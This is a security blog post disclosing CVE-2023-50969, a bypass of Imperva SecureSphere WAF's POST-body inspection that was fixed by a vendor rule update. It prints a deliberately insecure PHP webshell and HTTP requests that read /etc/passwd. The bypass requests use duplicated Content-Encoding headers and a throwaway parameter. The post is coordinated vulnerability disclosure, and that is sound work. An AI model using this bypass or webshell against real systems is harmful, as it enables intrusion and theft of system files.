

[![HoyaHaxa: A Security Research Blog](https://blogger.googleusercontent.com/img/a/AVvXsEhUCgr_s5i1lLMG8jSrZDgwfmOD0xvQEZ_4EtG19YgYDsjMJAV6B6IZErmSF8wXxJ4410IGeo2zlsVErr1Bwn2wjLVmIfGC4Bz4IFNS-fut8rnTuYn59wu61C0IMcEcEeUBd149LUZmCZ-SIcaLSXxunTA5_tCsc4kTCzQkd4hRjDFzCJolIAbvHVFQ=s1181)](https://www.hoyahaxa.com/)

## Wednesday, March 27, 2024

### Bypassing Imperva SecureSphere WAF (CVE-2023-50969)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi7bYRCobXq9lUjHF-A137dak7pU7gm79TWW3wqyTowSli5cICMRa9mfSM9a0O0DsLvIj1nKS1SDIaHP7LDWA0CQC416p4RUCD5RQ1EBvE5fRW-p_P365gcPQ6B6w9UN5Vkq93t2qBQtZKmIEze8Pi81OshhF6-S1Hy8cHi_Fsk7BnUQLLFIE59EFV8NOM/w462-h688/connors-jumpover.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi7bYRCobXq9lUjHF-A137dak7pU7gm79TWW3wqyTowSli5cICMRa9mfSM9a0O0DsLvIj1nKS1SDIaHP7LDWA0CQC416p4RUCD5RQ1EBvE5fRW-p_P365gcPQ6B6w9UN5Vkq93t2qBQtZKmIEze8Pi81OshhF6-S1Hy8cHi_Fsk7BnUQLLFIE59EFV8NOM/s739/connors-jumpover.png)
### Background

Imperva SecureSphere Web Application Firewall (WAF) is an on-premise security solution to inspect, monitor and block traffic to web applications.  Some versions of SecureSphere WAF are affected by a vulnerability that could allow an attacker to bypass WAF rules that inspect POST data and subsequently exploit flaws in protected web applications that would otherwise be blocked.

### Vulnerability Summary

**[CVE-2023-50969](https://www.cve.org/CVERecord?id=CVE-2023-50969)** – Imperva SecureSphere WAF Bypass for POST Data Inspection Rules

**Impact:** An attacker is able to bypass WAF rules that inspect POST data and would be able to successfully exploit existing vulnerabilities in protected applications that would otherwise be blocked.

**Severity:**  Critical *(CVSS 3.1 Base Score: 9.8 / Vector:  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)*

**Affected versions:** Tested on Imperva SecureSphere WAF v14.7.0.40; all versions of Imperva SecureSphere without the Application Defense Center (ADC) update referenced in the *"Fixed Version(s)"* section are vulnerable.  Imperva Cloud WAF is not affected.

**Fixed Version(s):** Per Imperva, this issue can be remediated by an ADC rule update that was released on February 26, 2024.  Imperva customers may get more information by logging into the Imperva Support Portal and reviewing the following document: <https://docs.imperva.com/bundle/z-kb-articles-km/page/f81a5705.html>

### Technical Details

To demonstrate the vulnerability, let’s assume that a protected application includes some vulnerable code.  In our case it’s a wildly insecure PHP webshell named clam.php:

<html>
<body>
<form method="POST" name="<?php echo basename($\_SERVER['PHP\_SELF']); ?>">
<input type="text" name="cmd" id="cmd" >
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($\_POST['cmd']))
    {
        system($\_POST['cmd']);
    }
?>
</pre>
</body>
</html>

By design, this page will execute any system command passed in the **cmd** POST parameter.

Many commands, such as trying to execute **cat /etc/password** , will get blocked by standard WAF rules.  (The same would apply for many other specific vulnerabilities and vulnerability classes such as Cross-Site Scripting, SQL Injection, and more.)  For example:

POST /clam.php HTTP/1.1
Host: my.target.host
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
cmd=cat+/etc/passwd

As expected, this gets blocked by a standard WAF rule:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPldGDr4M8GAdAPXaTr7AFceUe-rwyEYw5j3a8y5ZlSCB-r06Z5XLOQYLfWheQ7oe3kkmPTBH1Lc24aeQ7o-ZZ4gjswQCqpKDnu2pPeHiGqqqtUSX1chUT1houNMbd_BIj2hGP8BAnoY5B5l6hAYguZdN76C1Q08E86-ABOiPyXxvhwm_UXRknJGgw-Fs/w657-h353/imperva-blocked.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPldGDr4M8GAdAPXaTr7AFceUe-rwyEYw5j3a8y5ZlSCB-r06Z5XLOQYLfWheQ7oe3kkmPTBH1Lc24aeQ7o-ZZ4gjswQCqpKDnu2pPeHiGqqqtUSX1chUT1houNMbd_BIj2hGP8BAnoY5B5l6hAYguZdN76C1Q08E86-ABOiPyXxvhwm_UXRknJGgw-Fs/s632/imperva-blocked.png)

However, we can bypass the blocking WAF rule by sending a request with two (or more) specially-crafted **Content-Encoding** headers.  ([The Content-Encoding header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Encoding) is intended to list any encodings that have been applied to the HTTP message body.  Valid values are **br**, **compress**, **deflate**, and **gzip**)

If we modify our request and add a **Content-Encoding:** header with an arbitrary value, followed by a **Content-Encoding: gzip** header, we can then bypass the responsible WAF rule:

POST /clam.php HTTP/1.1
Host: my.target.host
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Encoding: No Kill No Beep Beep
Content-Encoding: gzip
Content-Length: 19
cmd=cat+/etc/passwd

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi4-SysR3QgPrWm7cZBbIog6IdiySCnx8BGSZvS_au2L6JtfsGFOQ7VHJX3L6rZmmQpulNWFkRKrfkvlW5-5rl8-InU2LINsSFsbegyAOw-zbgPEac8DRzWiBs3zM_-LITE8wPPL4fDB7aFmRLqYV6Pz_aB9xyGwOz4QsUkA1_FumVDB7uLkz0BD5m1_x4/w628-h610/impera-bypass.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi4-SysR3QgPrWm7cZBbIog6IdiySCnx8BGSZvS_au2L6JtfsGFOQ7VHJX3L6rZmmQpulNWFkRKrfkvlW5-5rl8-InU2LINsSFsbegyAOw-zbgPEac8DRzWiBs3zM_-LITE8wPPL4fDB7aFmRLqYV6Pz_aB9xyGwOz4QsUkA1_FumVDB7uLkz0BD5m1_x4/s811/impera-bypass.png)

In addition to using a **gzip** Header value, we can also successfully bypass WAF rules with an extra **Content-Encoding** header followed by a **Content-Encoding: deflate** header.  However, I’ve observed that in order to bypass some rules you may need to also add a throwaway POST parameter/value pair prior to the parameter/value pairs that would otherwise trigger a WAF rule.  So to successfully exploit our example above, we’d need to send request like:

POST /clam.php HTTP/1.1
Host: my.target.host
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Encoding: No Kill No Beep Beep
Content-Encoding: deflate
Content-Length: 19
qand=notu&cmd=cat+/etc/passwd

### Remediation Recommendations

Per Imperva, this issue can be remediated by an ADC rule update that was released on February 26, 2024.  Imperva customers may get more information by logging into the Imperva Support Portal and reviewing the following document: <https://docs.imperva.com/bundle/z-kb-articles-km/page/f81a5705.html>

### Acknowledgments

I’d like to thank Imperva for their prompt response to this vulnerability and [Carl Livitt for his previous security research on Imperva WAFs](https://github.com/0xhaggis/Imperva_gzip_bypass).

### Timeline

2023-11-10 - Reported the vulnerability to the Imperva.

2024-02-26 - ADC rule update to remediate the vulnerability available from Imperva.

2024-03-27 - Blog post published.

By

[Brian](https://www.blogger.com/profile/11469146940904500468 "author profile")

at

[March 27, 2024](https://www.hoyahaxa.com/2024/03/imperva-waf-bypass-cve-2023-50969.html "permanent link")

[Email This](https://www.blogger.com/share-post.g?blogID=8150770822327173457&postID=3049788268782712773&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=8150770822327173457&postID=3049788268782712773&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=8150770822327173457&postID=3049788268782712773&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=8150770822327173457&postID=3049788268782712773&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=8150770822327173457&postID=3049788268782712773&target=pinterest "Share to Pinterest")

Labels:
[security](https://www.hoyahaxa.com/search/label/security),
[waf](https://www.hoyahaxa.com/search/label/waf)

#### No comments:

#### Post a Comment

[Newer Post](https://www.hoyahaxa.com/2024/07/summercon-2024-slides-modern-coldfusion.html "Newer Post")

[Older Post](https://www.hoyahaxa.com/2024/03/defending-against-cve-2024-20767.html "Older Post")

[Home](https://www.hoyahaxa.com/)

Subscribe to:
[Post Comments (Atom)](https://www.hoyahaxa.com/feeds/3049788268782712773/comments/default)

## Blog Archive

* ▼
  [2024](https://www.hoyahaxa.com/2024/)
  (10)
  + ►
    [December](https://www.hoyahaxa.com/2024/12/)
    (1)
  + ►
    [August](https://www.hoyahaxa.com/2024/08/)
    (1)
  + ►
    [July](https://www.hoyahaxa.com/2024/07/)
    (2)
  + ▼
    [March](https://www.hoyahaxa.com/2024/03/)
    (4)
    - [Bypassing Imperva SecureSphere WAF (CVE-2023-50969)](https://www.hoyahaxa.com/2024/03/imperva-waf-bypass-cve-2023-50969.html)
    - [Defending Against CVE-2024-20767 (ColdFusion Arbit...](https://www.hoyahaxa.com/2024/03/defending-against-cve-2024-20767.html)
    - [If You're Running an Intranet Connections Lucee In...](https://www.hoyahaxa.com/2024/03/if-youre-running-intranet-connections.html)
    - [One Reason Why Your ColdFusion Server May Still Be...](https://www.hoyahaxa.com/2024/03/one-reason-why-your-coldfusion-server.html)
  + ►
    [February](https://www.hoyahaxa.com/2024/02/)
    (2)

* ►
  [2023](https://www.hoyahaxa.com/2023/)
  (11)
  + ►
    [December](https://www.hoyahaxa.com/2023/12/)
    (1)
  + ►
    [November](https://www.hoyahaxa.com/2023/11/)
    (1)
  + ►
    [October](https://www.hoyahaxa.com/2023/10/)
    (2)
  + ►
    [September](https://www.hoyahaxa.com/2023/09/)
    (1)
  + ►
    [August](https://www.hoyahaxa.com/2023/08/)
    (1)
  + ►
    [July](https://www.hoyahaxa.com/2023/07/)
    (1)
  + ►
    [May](https://www.hoyahaxa.com/2023/05/)
    (1)
  + ►
    [April](https://www.hoyahaxa.com/2023/04/)
    (1)
  + ►
    [March](https://www.hoyahaxa.com/2023/03/)
    (1)
  + ►
    [January](https://www.hoyahaxa.com/2023/01/)
    (1)

* ►
  [2022](https://www.hoyahaxa.com/2022/)
  (3)
  + ►
    [November](https://www.hoyahaxa.com/2022/11/)
    (1)
  + ►
    [October](https://www.hoyahaxa.com/2022/10/)
    (1)
  + ►
    [May](https://www.hoyahaxa.com/2022/05/)
    (1)

* ►
  [2021](https://www.hoyahaxa.com/2021/)
  (6)
  + ►
    [June](https://www.hoyahaxa.com/2021/06/)
    (2)
  + ►
    [May](https://www.hoyahaxa.com/2021/05/)
    (2)
  + ►
    [April](https://www.hoyahaxa.com/2021/04/)
    (2)

## Labels

* [security](https://www.hoyahaxa.com/search/label/security)
  (26)
* [cfml](https://www.hoyahaxa.com/search/label/cfml)
  (21)
* [coldfusion](https://www.hoyahaxa.com/search/label/coldfusion)
  (20)
* [encryption](https://www.hoyahaxa.com/search/label/encryption)
  (3)
* [stupidunixtricks](https://www.hoyahaxa.com/search/label/stupidunixtricks)
  (2)
* [xxe](https://www.hoyahaxa.com/search/label/xxe)
  (2)
* [oracle](https://www.hoyahaxa.com/search/label/oracle)
  (1)
* [ssrf](https://www.hoyahaxa.com/search/label/ssrf)
  (1)
* [waf](https://www.hoyahaxa.com/search/label/waf)
  (1)

## About

Hi - I'm Brian. This blog is a place for some of my personal security research and related topics I feel compelled to write about. Web application security, secure coding, offense, exploitation, stupid Unix tricks, ColdFusion/CFML, attic salt.

Available for select application security consulting, including web/mobile penetration testing, secure code reviews, secure SDLC, and product security services. Inquiries welcome.

## Links

* Contact
* [Twitter](https://twitter.com/hoyahaxa)

![](https://blogger.googleusercontent.com/img/a/AVvXsEhRrp9b6_mLLzseVcNtrSv4Wzf8brUVrFA2PN3ALbOpK8FFFgxHXRsuOjqfE2kQ5LHEoQXDbvJo4zKMftbDHCK9_P4K6C2fHemKB32wxIzAh4_ujhjDpGEmQdS5PTNB0_PuJfl9OOMpzxQ0PYNX0LIgPMKc1tDXoirS5bmL1Y9kzV2D9g1GakDH0FaAT0M=s252)

© Copyright 2021-2025 HoyaHaxa - All Rights Reserved. Powered by [Blogger](https://www.blogger.com).

